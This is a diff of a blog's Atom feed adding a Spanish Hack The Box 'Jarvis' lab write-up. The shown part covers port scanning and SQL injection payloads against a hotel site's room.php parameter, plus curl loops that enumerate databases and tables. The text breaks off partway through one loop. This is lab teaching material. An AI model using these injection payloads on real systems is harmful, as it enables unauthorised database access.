@@ -1,4 +1,484 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-26T20:01:53-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box SecNotes</title><link href="http://localhost:4000/htb-secnotes/" rel="alternate" type="text/html" title="Hack The Box SecNotes" /><published>2021-12-26T00:00:00-06:00</published><updated>2021-12-26T00:00:00-06:00</updated><id>http://localhost:4000/htb-secnotes</id><content type="html" xml:base="http://localhost:4000/htb-secnotes/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/banner-secnotes.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-31T22:46:33-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Jarvis</title><link href="http://localhost:4000/htb-jarvis/" rel="alternate" type="text/html" title="Hack The Box Jarvis" /><published>2021-12-31T00:00:00-06:00</published><updated>2021-12-31T00:00:00-06:00</updated><id>http://localhost:4000/htb-jarvis</id><content type="html" xml:base="http://localhost:4000/htb-jarvis/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/banner-jarvis.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;jarvis&quot;&gt;Jarvis&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.143.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.143
+PING 10.10.10.143 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.143&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.143: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.143 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.756/136.756/136.756/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.143 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-26 20:08 CST
+Initiating Ping Scan at 20:08
+Scanning 10.10.10.143 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
+Completed Ping Scan at 20:08, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 20:08
+Scanning 10.10.10.143 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 22/tcp on 10.10.10.143
+Discovered open port 80/tcp on 10.10.10.143
+SYN Stealth Scan Timing: About 48.38% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 20:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:33 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Discovered open port 64999/tcp on 10.10.10.143
+Completed SYN Stealth Scan at 20:09, 56.60s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.143
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65532 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+64999/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;56.92 seconds
+           Raw packets sent: 67041 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.950MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 67038 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.682MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.143
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80,64999
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,64999 10.10.10.143 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-26 20:10 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.143
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp    open  http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Stark Hotel
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
+|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+64999/tcp open  http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
+|_http-server-header: Apache/2.4.25 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que se encuentran abiertos los puertos 80 y 64999 asociados al servicio HTTP, por lo que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.143/
+http://10.10.10.143/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;edge]
+❯ whatweb http://10.10.10.143:64999/
+http://10.10.10.143:64999/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.143], UncommonHeaders[ironwaf]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si procedemos a ver el contenido vía web para ambos puertos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como por el puerto 64999 no nos muestra información que podamos analizar, vamos a empezar por el puerto 80 y tratar de ver los hipervínculos si nos lleva a algún lado haciendo &lt;em&gt;hovering&lt;/em&gt; y tenemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rooms-suites.php&lt;/code&gt; en donde vemos algunas habitaciones que al hacer &lt;em&gt;hovering&lt;/em&gt; vemos algo curioso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;room.php?cod=1&lt;/code&gt; en donde el número cambia de acuerdo con la habitación que seleccionemos; por lo que ya debemos estar pensando que debe existir una base de datos por detrás.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si tratamos de hacer un &lt;em&gt;fuzzing&lt;/em&gt; para descubrir hasta que número hay algún resultado, nos aparecerá el banner mostrado en el puerto 64999; por lo que vamos a omitir el uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; o similares y mejor vamos a utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para tratar de descubrir nuevas rutas en el servidor web.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.143 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; webScan
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-26 20:40 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.143
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /phpmyadmin/: phpMyAdmin
+|   /css/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.25 (debian)'&lt;/span&gt;
+|   /images/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.25 (debian)'&lt;/span&gt;
+|_  /js/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.25 (debian)'&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.10 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos un recurso interesante, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpmyadmin&lt;/code&gt; que si ingresamos, tenemos el panel de login:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En este punto, sabemos que existe una base de datos en donde se tienen las habitaciones y la podemos cambiar a través de la URL; por lo que vamos a tratar de realizar unas inyeccions SQL para que ver pasa.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;10.10.10.143/room.php?cod=3’ or 1=1– - &amp;gt; Desaparece las imagen y el precio.&lt;/li&gt;
+  &lt;li&gt;10.10.10.143/room.php?cod=1 and sleep(5)– - &amp;gt; Vemos que la web tarda 5 segundos en responder, por lo tanto podría ser vulnerable a SQLi basada en tiempo.&lt;/li&gt;
+  &lt;li&gt;10.10.10.143/room.php?cod=0 union select 1,2,3,4,5,6,7– - &amp;gt; Vemos que se nos muestran las etiquetas para las columnas de las tablas (se estuvo intentando desde 1 hasta donde se observara algún resultado y bajo un número que no mostrata información, en este caso 0). Por lo tanto, ya podríamos escoger un valor de los observamos para inyectar comandos y obtener información sobre la base de datos.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;10.10.10.143/room.php?cod=0 union select 1,2,database(),4,5,6,7– - &amp;gt; Sustituimos la etiqueta del número 3 por el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;databse()&lt;/code&gt; y al cargar deberíamos de ver que en el lugar donde antes estaba el 3, ahora vemos el nombre de la base de datos, para este caso es &lt;strong&gt;hotel&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;10.10.10.143/room.php?cod=0 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1– - &amp;gt; Vemos las bases de datos en el servidor y vamos recorriendolas con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limit 0,1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limit 1,1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limit 2,1&lt;/code&gt; y así sucesivamente. Por lo que tenemos las siguientes bases de datos:
+    &lt;ul&gt;
+      &lt;li&gt;hotel&lt;/li&gt;
+      &lt;li&gt;information_schema&lt;/li&gt;
+      &lt;li&gt;mysql&lt;/li&gt;
+      &lt;li&gt;performance_schema&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Una forma de obtener las tablas sería con el siguiente comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 10&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] DB &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,schema_name,4,5,6,7%20from%20information_schema.schemata%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 0: hotel
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 1: information_schema
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 2: mysql
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 3: performance_schema
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 4: 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 5: 
+^C#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De manera similar, podríamos obtener los nombres de las tablas con la sentencia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.143/room.php?cod=0 union select 1,2,table_name,4,5,6,7 from information_schema.tables limit 0,1-- -&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 150&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Tabla &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 0: room
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 1: ALL_PLUGINS
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 2: APPLICABLE_ROLES
+^C#                  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para este caso y para adelantar un poco, vamos a empezar desde la tabla 100:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;100 150&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Tabla &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span 